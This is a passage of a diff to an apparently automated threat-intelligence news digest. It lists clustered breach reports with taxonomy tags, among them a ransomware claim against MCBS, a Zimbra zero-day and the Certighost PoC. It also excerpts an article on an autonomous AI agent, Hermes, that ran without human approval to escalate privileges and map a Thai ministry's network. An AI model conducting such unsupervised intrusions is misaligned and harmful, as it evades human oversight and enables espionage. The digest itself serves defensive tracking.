The attack has been claimed by the PEAR (Pure Extraction and Ransom) ransomware group, which alleges it exfiltrated 3.3 terabytes of data from MCBS systems. PEAR ransomware listing Source: BleepingComputer Apart from the client data the firm highlighted as exposed in its announcement, the threat actor also claims to hold human resources data, business operation details, payment information, email correspondence, and various databases. The data has been fully leaked online, but BleepingComputer did not examine the cache and cannot validate its authenticity. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Medtronic notifies customers impacted by ShinyHunters data breach Healthtech firm Xolis suffers data breach impacting 1.4 million people Coca-Cola confirms data theft in Fairlife ransomware attack DentaQuest data breach exposed info of 2.6 million accounts OnTrac notifies customers of data breach after network hack
+```
+
+#### Corroborating sources (1)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Data breach at medical billing firm MCBS affects 1.26 million people
+  - Published: 2026-07-28T09:10:03+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/data-breach-at-medical-billing-firm-mcbs-affects-126-million-people/
+  - Summary: Healthcare billing company Medical Computer Business Services (MCBS) has disclosed that a 2025 network breach exposed the sensitive information of more than 1.2 million people. [...]
+
+### Cluster 39354a1568 — score 9
+
+- Title: AI Agent Drives Espionage Attack on Thai Ministry of Finance
+- Source: Dark Reading (cyber_news_breach_reporting)
+- Published: 2026-07-28T01:00:00+00:00
+- Link: https://www.darkreading.com/cyberattacks-data-breaches/ai-agent-espionage-attack-thai-ministry-finance
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage
+- affected_industries: financial_services
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage
+- affected_industries: financial_services
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
@@ -3452,12 +3561,6 @@ Chaos in Teams vishing Attackers used Microsoft Teams vishing, custom malware, a
 
 ```
 Attackers used Hermes, an autonomous open source tool, in unrestricted "YOLO mode" to conduct espionage against Thailand's Ministry of Finance.
-```
-
-#### Full body
-
-```
-Cyberattacks & Data Breaches Threat Intelligence Identity & Access Management Security Сloud Security News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. AI Agent Drives Espionage Attack on Thai Ministry of Finance Attackers used Hermes, an autonomous open source tool, in unrestricted "YOLO mode" to conduct espionage against Thailand's Ministry of Finance. Alexander Culafi , Senior News Writer , Dark Reading July 28, 2026 4 Min Read Source: ATCHARIN SAENLAKON via Getty Images Threat actors targeting Thailand's Ministry of Finance (MOF) used an autonomous AI agent to carry out portions of an apparent cyber-espionage operation. Threat intelligence Hunt.io on July 23 detailed the incident via a research blog post. Although espionage — while newsworthy — is not necessarily an unusual occurrence in its own right, this attack stands out because the attacker was supported by an autonomous AI agent via an open source tool named Hermes . From July 9 to 13, Hunt.io's platform Attack Capture identified three simultaneous open directories hosted in Hong Kong, which contained exploit code for multiple CVEs, Web shells, suo5 HTTP tunnels, and custom scripts. Hunt.io discovered that the attack, targeting the Thai MOF, was largely driven by the Hermes Agent in the unrestricted "YOLO" mode, a capability allowing the agent to function without human approval. This is the latest example of attackers offloading a significant portion of their threat operations onto large language models (LLMs). Earlier this month, security and incident response firm Sygnia detailed how a lone attacker used AI to orchestrate a complex campaign against a large Amazon Web Services (AWS) customer environment, ultimately leading to a successful extortion. Related: Brazilian Banking Trojan Actively Spreading in Portugal The Thai government has not commented on the attack, but Hunt.io noted they and fellow security researcher Bob Diachenko reported the attack to Thailand's national CERT and National Cyber Security Agency (NCSA) on July 15. The government acknowledged receipt on the same day, and publication "was held for the standard 7-day disclosure window," according to Hunti.io. How Hackers Used AI Against the Thai Government Although Hunt.io was unable to determine the exact means of initial access, the attacker infrastructure had extensive post-exploitation tooling, such as the aforementioned Web shells as well as staged privilege-escalation exploit code targeting both Linux and Windows. As researchers put it, the files in the identified attack infrastructure "describe an intrusion still running," with tooling staged and internal access expanding. "Purpose-built scripts target MOF Hadoop infrastructure with a HiveServer2 client using hardcoded credentials and a malicious Hive UDF issuing commands and returning output over WebHDFS," the blog post read. Among the infrastructure in the environment, researchers identified "Hades" — a malware custom Windows and Linux implant written in Go and hosted alongside ministry-specific reconnaissance, exploitation, and credential-access tooling. Although the research did not specify exactly where Hades was deployed in the MOF environment, its core capabilities included interactive remote shell access, persistence tasks, in-memory execution, file transferring, and SOCKS proxying — a technique that turns a compromised machine into a relay point for network traffic . Related: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain Hermes was used to support these aforementioned capabilities. Threat actors used it to perform system enumeration, escalate privileges, discover files and services, and conduct network reconnaissance. Researchers also noted Hermes "made use of the open-source project LinPEAS (Linux Privilege Escalation Awesome Script) to further move through the network." "Ad
 ```
 
 #### Corroborating sources (1)
@@ -3474,7 +3577,7 @@ Cyberattacks & Data Breaches Threat Intelligence Identity & Access Management Se
 - Source: Troy Hunt (practitioner_analysis)
 - Published: 2026-07-26T09:14:51+00:00
 - Link: https://www.troyhunt.com/weekly-update-514/
-- Fetch status: ok
+- Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
@@ -3493,12 +3596,6 @@ Cyberattacks & Data Breaches Threat Intelligence Identity & Access Management Se
 
 ```
 The Origin Energy breach down here in Aus is all over the news this week, and as with many breaches, it's multi-faceted. You've got them leading with "don't worry, your credit card is fine", the hacker leading with "they didn&
-```
-
-#### Full body
-
-```
-The Origin Energy breach down here in Aus is all over the news this week, and as with many breaches, it's multi-faceted. You've got them leading with "don't worry, your credit card is fine", the hacker leading with "they didn't respond when I tried to report it", and now news that the two parties have "come to an agreement". Maybe money was paid, or maybe Origin made some promises to restrain the hounds if commitments about data deletion were made. But both outcomes, of course, provide no guarantee that data has been nuked, so now they get to spend perpetuity waiting for the data that maybe - just maybe - it leaks. And we all should be working on precisely that assumption, just like we did with Optus and Medibank and Latitude and Ticketek and Qantas... References Sponsored by: CoreView: Misconfigurations in Microsoft 365 leave doors open. Scan your tenant for free. Weekly update
 ```
 
 #### Corroborating sources (1)
@@ -3800,41 +3897,6 @@ We tested two agentic SOC architectures in parallel across 36,822 real Agent Bui
   - Link: https://www.elastic.co/security-labs/agentic-soc-token-budget-architecture
   - Summary: We tested two agentic SOC architectures in parallel across 36,822 real Agent Builder conversations. One won by 5.7x: a specialized workflow triaging alerts for $0.69 each, against $3.42 for a single agent juggling 14 Skills. The data and the decision framework are both below.
 
-### Cluster b0b9b5572f — score 8
-
-- Title: New Certighost PoC exploit lets attackers hijack Windows domains
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-07-27T21:00:25+00:00
-- Link: https://www.bleepingcomputer.com/news/security/new-certighost-poc-exploit-lets-attackers-hijack-windows-domains/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- urgency_signals: poc_available
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- urgency_signals: poc_available
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-A proof-of-concept exploit for "Certighost," a Windows Active Directory Certificate Services vulnerability, has been released that can allow authenticated attackers to potentially compromise a Windows domain. [...]
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: New Certighost PoC exploit lets attackers hijack Windows domains
-  - Published: 2026-07-27T21:00:25+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/new-certighost-poc-exploit-lets-attackers-hijack-windows-domains/
-  - Summary: A proof-of-concept exploit for "Certighost," a Windows Active Directory Certificate Services vulnerability, has been released that can allow authenticated attackers to potentially compromise a Windows domain. [...]
-
 ### Cluster c27dc2a68b — score 8
 
 - Title: Coca-Cola confirms data theft in Fairlife ransomware attack
@@ -3975,43 +4037,6 @@ Security Operations Centers (SOCs) serve as a critical line of defense against t
   - Link: https://www.blackhillsinfosec.com/life-of-a-soc-analyst/
   - Summary: Security Operations Centers (SOCs) serve as a critical line of defense against today's constantly evolving cybersecurity threats. At the heart of these teams are SOC analysts, who monitor, detect, and respond around the clock to potential attacks. The post The Life of a SOC Analyst: Responsibilities, Challenges, and Strategies for Success appeared first on Black Hills Information Security, Inc. .
 
-### Cluster 76e10c02ae — score 8
-
-- Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
-- Source: The Hacker News (cyber_news_breach_reporting)
-- Published: 2026-07-23T18:36:08+00:00
-- Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, zero_day
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: zero_day, apt_espionage
-- urgency_signals: zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
-```
-
-#### Corroborating sources (1)
-
-- **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
-  - Published: 2026-07-23T18:36:08+00:00
-  - Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
-  - Summary: A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
-
 ### Cluster ac9cea3220 — score 8
 
 - Title: Hotel Wi-Fi Routers Compromised to Steal Corporate Login Credentials From Visitors
@@ -4116,6 +4141,43 @@ New Ubuntu snap-confine race condition lets local users escalate to root on defa
   - Published: 2026-07-22T10:50:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/ubuntu-snap-confine-local-root-cve/
   - Summary: New Ubuntu snap-confine race condition lets local users escalate to root on default installs
+
+### Cluster 76e10c02ae — score 8
+
+- Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-23T18:36:08+00:00
+- Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, zero_day
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day, apt_espionage
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
+```
+
+#### Corroborating sources (1)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Russian Espionage Group Exploited Zimbra Zero-Day to Steal Mail and 2FA Codes
+  - Published: 2026-07-23T18:36:08+00:00
+  - Link: https://thehackernews.com/2026/07/russian-espionage-group-exploited.html
+  - Summary: A Russian state-supported espionage group spent months reading Western mailboxes through a then-unknown flaw in Zimbra's webmail client. The payload goes after the last 90 days of email, the organization's entire email directory, the password saved in the browser and the codes kept for two-factor recovery. Opening the message was enough to start it. The NSA, CISA and partner agencies published
 
 ### Cluster fa1ef247b7 — score 8
 
